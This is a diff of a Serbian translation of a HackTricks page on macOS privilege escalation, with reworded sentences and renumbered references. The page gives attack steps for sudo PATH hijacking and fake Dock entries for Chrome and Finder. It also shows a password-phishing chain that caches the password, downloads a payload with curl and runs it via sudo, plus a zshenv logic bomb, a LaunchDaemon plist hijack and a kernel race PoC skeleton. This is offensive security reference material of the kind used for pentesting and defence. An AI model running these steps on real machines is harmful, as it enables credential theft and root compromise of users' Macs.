@@ -1,8 +1,8 @@
-# macOS eskalacija privilegija
+# macOS Eskalacija privilegija
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TCC eskalacija privilegija
+## TCC Eskalacija privilegija
 
 Ako ste ovde došli tražeći TCC eskalaciju privilegija, idite na:
 
@@ -13,20 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Imajte na umu da će **većina trikova za eskalaciju privilegija koji utiču na Linux/Unix takođe uticati i na MacOS** mašine. Zato pogledajte:
+Imajte na umu da će **većina trikova za eskalaciju privilegija koji utiču na Linux/Unix takođe uticati na MacOS** mašine. Zato pogledajte:
 
 
 {{#ref}}
 ../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
 {{#endref}}
 
-## Interakcija korisnika
+## Interakcija sa korisnikom
 
 ### Sudo Hijacking
 
-Originalnu [Sudo Hijacking tehniku možete pronaći u članku o Linux eskalaciji privilegija](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
+Originalnu [Sudo Hijacking tehniku možete pronaći u članku o Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
 
-Međutim, macOS **zadržava** korisnikov **`PATH`** kada izvršava **`sudo`**. To znači da bi drugi način za izvođenje ovog napada bio **hijacking drugih binarnih datoteka** koje će žrtva i dalje izvršavati kada **pokrene sudo:**
+Međutim, macOS **zadržava** korisnikov **`PATH`** kada on izvršava **`sudo`**. To znači da bi drugi način za izvođenje ovog napada bio **preuzimanje drugih binarnih datoteka** koje će žrtva i dalje izvršavati prilikom **pokretanja sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<'EOF'
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Napomena: korisnik koji koristi **terminal** veoma verovatno ima instaliran **Homebrew**. Zato je moguće preoteti binarne fajlove u **`/opt/homebrew/bin`**.
+Imajte na umu da će korisnik koji koristi **terminal** vrlo verovatno imati instaliran **Homebrew**. Zato je moguće hijack-ovati binarne fajlove u **`/opt/homebrew/bin`**.
 
-### Imitacija Dock-a
+### Dock Impersonation
 
-Pomoću **social engineering-a** možete **imitirati, na primer, Google Chrome** unutar Dock-a i zapravo izvršiti sopstveni script:
+Korišćenjem **social engineering-a** možete, na primer, **impersonate-ovati Google Chrome** unutar dock-a i zapravo izvršiti sopstvenu skriptu:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Neki predlozi:
 
-- Proverite da li se u Dock-u nalazi Chrome i, ako je tako, **uklonite** taj unos i **dodajte** **lažni** **Chrome unos na istu poziciju** u Dock nizu.
+- Proverite da li se u Dock-u nalazi Chrome i, ako se nalazi, **uklonite** tu stavku i **dodajte** **fake** **Chrome stavku na istoj poziciji** u Dock nizu.
 
 <details>
 <summary>Chrome Dock impersonation script</summary>
@@ -131,11 +131,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Neki predlozi:
 
-- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete postaviti lažni Finder odmah pored pravog. Za ovo je potrebno da **dodate unos lažnog Finder-a na početak niza Dock-a**.
-- Druga opcija je da ga ne postavite u Dock, već da ga samo otvorite; „Finder asking to control Finder“ nije toliko neobično.
-- Druga opcija za **escalate to root without asking** za password, bez užasnog prozora, jeste da učinite da Finder zaista zatraži password za izvršavanje privilegovane radnje:
-- Zatražite od Finder-a da kopira novi **`sudo`** fajl u **`/etc/pam.d`**. (Prompt koji traži password će navesti da „Finder želi da kopira sudo“.)
-- Zatražite od Finder-a da kopira novi **Authorization Plugin**. (Možete kontrolisati ime fajla, tako da će prompt koji traži password navesti da „Finder želi da kopira Finder.bundle“.)
+- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete staviti lažni Finder odmah pored pravog. Za ovo morate **dodati unos lažnog Finder-a na početak niza Dock-a**.
+- Druga opcija je da ga ne postavite u Dock, već ga samo otvorite; „Finder traži dozvolu za upravljanje Finder-om“ nije toliko čudno.
+- Druga opcija za **eskalaciju na root bez traženja** lozinke uz užasan prozor jeste da naterate Finder da zaista zatraži lozinku za izvršavanje privilegovane radnje:
+- Zatražite od Finder-a da kopira novu **`sudo`** datoteku u **`/etc/pam.d`** (dijalog za unos lozinke će naznačiti da „Finder želi da kopira sudo“)
+- Zatražite od Finder-a da kopira novi **Authorization Plugin** (Možete kontrolisati ime datoteke tako da će dijalog za unos lozinke naznačiti da „Finder želi da kopira Finder.bundle“)
 
 <details>
 <summary>Finder Dock impersonation script</summary>
@@ -213,13 +213,13 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-### Phishing prompta za lozinku + ponovna upotreba sudo-a
+### Phishing sa zahtevom za lozinku + ponovna upotreba sudo
 
-Malware često zloupotrebljava interakciju korisnika kako bi **preuzeo lozinku koja omogućava sudo** i programski je ponovo upotrebio. Uobičajen tok:
+Malware često zloupotrebljava interakciju sa korisnikom kako bi **uhvatio lozinku koja omogućava sudo** i programski je ponovo upotrebio. Uobičajen tok:
 
-1. Identifikujte prijavljenog korisnika pomoću `whoami`.
-2. **Ponavljajte promptove za lozinku** sve dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
-3. Keširajte credential (npr. `/tmp/.pass`) i izvršavajte privilegovane radnje pomoću `sudo -S` (lozinka preko standardnog ulaza).
+1. Identifikovati prijavljenog korisnika pomoću `whoami`.
+2. **Ponavljati zahteve za lozinku** sve dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
+3. Keširati akreditiv (npr. `/tmp/.pass`) i izvršavati privilegovane radnje pomoću `sudo -S` (lozinka preko standardnog ulaza).
 
 Primer minimalnog lanca:
 ```bash
@@ -232,13 +232,13 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-Ukradena lozinka se zatim može ponovo upotrebiti za **uklanjanje Gatekeeper quarantine pomoću `xattr -c`**, kopiranje LaunchDaemons ili drugih privilegovanih datoteka i neinteraktivno pokretanje dodatnih faza.
+Ukradena lozinka se zatim može ponovo upotrebiti za **uklanjanje Gatekeeper karantina pomoću `xattr -c`**, kopiranje LaunchDaemons ili drugih privilegovanih datoteka i neinteraktivno pokretanje dodatnih faza.<sup>[[1]](#references)</sup>
 
 ## Vektori specifični za novije verzije macOS-a (2023–2025)
 
 ### Zastareli `AuthorizationExecuteWithPrivileges` je i dalje upotrebljiv
 
-`AuthorizationExecuteWithPrivileges` je zastareo od verzije 10.7, ali **i dalje radi na Sonoma/Sequoia**. Mnogi komercijalni updaters pozivaju `/usr/libexec/security_authtrampoline` sa nepouzdanom putanjom. Ako je ciljna binarna datoteka upisiva za korisnika, možete postaviti trojanca i iskoristiti legitimni prompt:
+`AuthorizationExecuteWithPrivileges` je označen kao zastareo u verziji 10.7, ali **i dalje radi na sistemima Sonoma/Sequoia**. Mnogi komercijalni updateri pozivaju `/usr/libexec/security_authtrampoline` sa nepouzdanom putanjom. Ako ciljna binarna datoteka dozvoljava upis korisniku, možete postaviti trojanca i iskoristiti legitimni upit:
 ```bash
 # find vulnerable helper calls
 log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
@@ -248,14 +248,14 @@ cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
 chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
-Kombinujte sa **masquerading trikovima iznad** da biste prikazali uverljiv dijalog za lozinku.
+Kombinujte sa **masquerading trikovima iznad** kako biste prikazali uverljiv dijalog za lozinku.
 
 
-### Triage privileged helper / XPC
+### Privileged helper / XPC trijaža
 
-Mnogi moderni macOS privescs trećih strana prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC service** iz **`/Library/PrivilegedHelperTools`**, a zatim helper ili **ne proverava klijenta**, proverava ga **prekasno** (PID race), ili izlaže **root method** koja koristi **putanju/script pod kontrolom korisnika**. Ovo je klasa bugova koja stoji iza mnogih nedavnih helper bugova u VPN klijentima, game launcherima i updaterima.<sup>[[4]](#references)</sup>
+Mnogi savremeni third-party macOS privescs prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC service** iz direktorijuma **`/Library/PrivilegedHelperTools`**, a zatim helper ili **ne validira klijenta**, validira ga **prekasno** (PID race), ili izlaže **root metodu** koja koristi path/script pod kontrolom korisnika. Ovo je klasa bugova koja stoji iza mnogih nedavnih helper bugova u VPN klijentima, game launcherima i updaterima.<sup>[[2]](#references)</sup>
 
-Brza triage checklist:
+Brza trijaža — kontrolna lista:
 ```bash
 ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
 plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
@@ -265,19 +265,19 @@ codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.ap
 strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
 done
 ```
-Posebnu pažnju obratite na pomoćne komponente koje:
+Obratite posebnu pažnju na pomoćne usluge koje:
 
 - nastavljaju da prihvataju zahteve **nakon deinstalacije** zato što je job ostao učitan u `launchd`
 - izvršavaju skripte ili čitaju konfiguraciju iz **`/Applications/...`** ili drugih putanja u koje korisnici koji nisu root mogu da upisuju
 - oslanjaju se na validaciju peer-a zasnovanu na **PID-u** ili samo na **bundle-id-u**, koja može biti podložna race uslovima
 
-Za više detalja o greškama u autorizaciji helper-a pogledajte [ovu stranicu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).
+Za više detalja o greškama u autorizaciji pomoćnih usluga pogledajte [ovu stranicu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).
 
-### PackageKit nasleđivanje okruženja skripte (CVE-2024-27822)
+### Nasleđivanje okruženja skripte PackageKit (CVE-2024-27822)
 
-Dok Apple nije rešio ovaj problem u verzijama **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacije koje je pokrenuo korisnik putem **`Installer.app`** / **`PackageKit.framework`** mogle su da izvrše **PKG skripte kao root unutar okruženja trenutno prijavljenog korisnika**. To znači da bi paket koji koristi **`#!/bin/zsh`** učitao napadačev **`~/.zshenv`** i pokrenuo ga kao **root** kada bi žrtva instalirala paket.<sup>[[3]](#references)</sup>
+Sve dok Apple to nije popravio u verzijama **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacije koje je korisnik pokrenuo putem **`Installer.app`** / **`PackageKit.framework`** mogle su da izvrše **PKG skripte kao root unutar okruženja trenutnog korisnika**. To znači da bi paket koji koristi **`#!/bin/zsh`** učitao napadačev **`~/.zshenv`** i izvršio ga kao **root** kada bi žrtva instalirala paket.<sup>[[3]](#references)</sup>
 
-Ovo je naročito zanimljivo kao **logic bomb**: potrebno je samo da imate foothold na korisničkom nalogu i shell startup fajl u koji može da se upisuje, a zatim čekate da korisnik izvrši bilo koji ranjivi installer zasnovan na **zsh-u**. Ovo se uglavnom ne odnosi na **MDM/Munki** deployment-e, jer se oni izvršavaju unutar okruženja root korisnika.<sup>[[3]](#references)</sup>
+Ovo je naročito zanimljivo kao **logic bomb**: potreban vam je samo foothold na korisničkom nalogu i shell startup fajl u koji može da se upisuje, a zatim čekate da korisnik izvrši bilo koji ranjivi installer zasnovan na **zsh-u**. Ovo se uglavnom **ne odnosi** na **MDM/Munki** deployment-e, jer se oni izvršavaju unutar okruženja root korisnika.<sup>[[3]](#references)</sup>
 ```bash
 # inspect a vendor pkg for shell-based install scripts
 pkgutil --expand-full Target.pkg /tmp/target-pkg
@@ -287,11 +287,11 @@ rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
 # logic bomb example for vulnerable zsh-based installers
 echo 'id > /tmp/pkg-root' >> ~/.zshenv
 ```
-Ako želite detaljniji pregled zloupotrebe specifične za installere, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).
+Ako želite dublji uvid u zloupotrebu specifičnu za instalere, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).
 
 ### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
 
-Ako su LaunchDaemon plist ili njegov cilj `ProgramArguments` **upisivi od strane korisnika**, možete eskalirati privilegije tako što ćete ga zameniti, a zatim naterati launchd da ga ponovo učita:
+Ako su LaunchDaemon plist ili njegov cilj `ProgramArguments` **upisivi od strane korisnika**, možete izvršiti privilege escalation tako što ćete ga zameniti, a zatim primorati launchd da ga ponovo učita:
 ```bash
 sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
 cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
@@ -308,38 +308,38 @@ cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
 PLIST
 sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
 ```
-Ovo odgovara exploit obrascu objavljenom za **CVE-2025-24085**, u kojem je writable plist iskorišćen za izvršavanje attacker code-a sa root privilegijama.
+Ovo odražava exploit obrazac objavljen za **CVE-2025-24085**, gde je writable plist iskorišćen za izvršavanje koda napadača kao root.
 
 ### XNU SMR credential race (CVE-2025-24118)
 
-**Race u `kauth_cred_proc_update`** omogućava lokalnom attackeru da korumpira read-only credential pointer (`proc_ro.p_ucred`) tako što izvršava `setgid()`/`getgid()` petlje preko thread-ova sve dok ne dođe do torn `memcpy` operacije. Uspešna korupcija omogućava dobijanje **uid 0** i pristup kernel memoriji. Minimalna struktura PoC-a:
+**Race u `kauth_cred_proc_update`** omogućava lokalnom napadaču da korumpira read-only credential pointer (`proc_ro.p_ucred`) pokretanjem `setgid()`/`getgid()` petlji u više niti, sve dok ne dođe do torn `memcpy` operacije. Uspešna korupcija obezbeđuje **uid 0** i pristup kernel memoriji. Minimalna PoC struktura:
 ```c
 // thread A
 while (1) setgid(rand());
 // thread B
 while (1) getgid();
 ```
-Kombinujte sa heap grooming tehnikom kako biste kontrolisane podatke smestili tamo gde se pokazivač ponovo čita. Na ranjivim buildovima ovo omogućava pouzdan **local kernel privesc** bez potrebe za SIP bypass-om.<sup>[[2]](#references)</sup>
+Uparite sa **heap grooming** tehnikom da biste kontrolisane podatke smestili na mesto sa kog se pokazivač ponovo čita. Na ranjivim buildovima ovo predstavlja pouzdan **local kernel privesc** bez potrebe za SIP bypass-om.<sup>[[4]](#references)</sup>
 
-### SIP bypass preko Migration assistant-a ("Migraine", CVE-2023-32369)
+### SIP bypass putem Migration Assistant-a ("Migraine", CVE-2023-32369)
 
-Ako već imate root, SIP i dalje blokira upisivanje u sistemske lokacije. Greška **Migraine** zloupotrebljava entitlement Migration Assistant-a `com.apple.rootless.install.heritable` kako bi pokrenula child process koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`).<sup>[[1]](#references)</sup> Lanac:
+Ako već imate root, SIP i dalje blokira upisivanje u sistemske lokacije. Greška **Migraine** zloupotrebljava entitlemenеt Migration Assistant-a `com.apple.rootless.install.heritable` kako bi pokrenula child process koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Lanac napada:
 
 1. Dobavite root na aktivnom sistemu.
-2. Pokrenite `systemmigrationd` sa posebno kreiranim stanjem kako bi izvršio binary pod kontrolom napadača.
-3. Iskoristite nasleđeni entitlement za izmenu SIP-zaštićenih fajlova, čime se persistence zadržava i nakon reboot-a.
+2. Aktivirajte `systemmigrationd` pomoću posebno kreiranog stanja kako bi pokrenuo binary pod kontrolom napadača.
+3. Iskoristite nasleđeni entitlement za izmenu datoteka zaštićenih SIP-om, čime se persistence zadržava i nakon reboot-a.
 
-### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
+### NSPredicate/XPC expression smuggling (klasa grešaka CVE-2023-23530/23531)
 
-Više Apple daemon-a prihvata **NSPredicate** objekte preko XPC-a i proverava samo polje `expressionType`, koje je pod kontrolom napadača. Kreiranjem predicate-a koji izvršava proizvoljne selektore možete postići **code execution u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). U kombinaciji sa početnim app sandbox escape-om, ovo omogućava **privilege escalation bez korisničkih promptova**. Potražite XPC endpoint-e koji deserijalizuju predicate-e i nemaju robustan visitor.
+Više Apple daemon-a prihvata **NSPredicate** objekte putem XPC-a i proverava samo polje `expressionType`, nad kojim napadač ima kontrolu. Kreiranjem predicate-a koji izvršava proizvoljne selectore možete postići **code execution u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). Kada se ovo kombinuje sa početnim bekstvom iz app sandbox-a, dobija se **privilege escalation bez korisničkih promptova**. Potražite XPC endpoint-e koji deserijalizuju predicate-e i nemaju robustan visitor.<sup>[[6]](#references)</sup>
 
-## TCC - Root Privilege Escalation
+## TCC - Root eskalacija privilegija
 
-### CVE-2020-9771 - mount_apfs TCC bypass i privilege escalation
+### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija
 
-**Bilo koji korisnik** (čak i unprivileged korisnik) može da kreira i mount-uje Time Machine snapshot sa `-o noowners` i **pristupi SVIM fajlovima** tog snapshot-a, zaobilazeći provere vlasništva na aktivnom volume-u. Jedina potrebna privilegija jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).
+**Bilo koji korisnik** (čak i korisnik bez privilegija) može da kreira i mount-uje Time Machine snapshot pomoću `-o noowners` i da **pristupi SVIM datotekama** tog snapshot-a, zaobilazeći provere vlasništva na aktivnom volumenu. Jedina potrebna privilegija jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).
 
-Komande i potpuno objašnjenje nalaze se na stranici TCC bypasses:
+Komande i potpuno objašnjenje nalaze se na stranici o TCC bypass-ima:
 
 {{#ref}}
 macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
@@ -347,7 +347,7 @@ macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
 
 ## Osetljive informacije
 
-Ovo može biti korisno za escalation privilegija:
+Ovo može biti korisno za eskalaciju privilegija:
 
 
 {{#ref}}
@@ -356,9 +356,11 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 ## Reference
 
-- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 - [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
-- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
+- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
 
 {{#include ../../banners/hacktricks-training.md}}
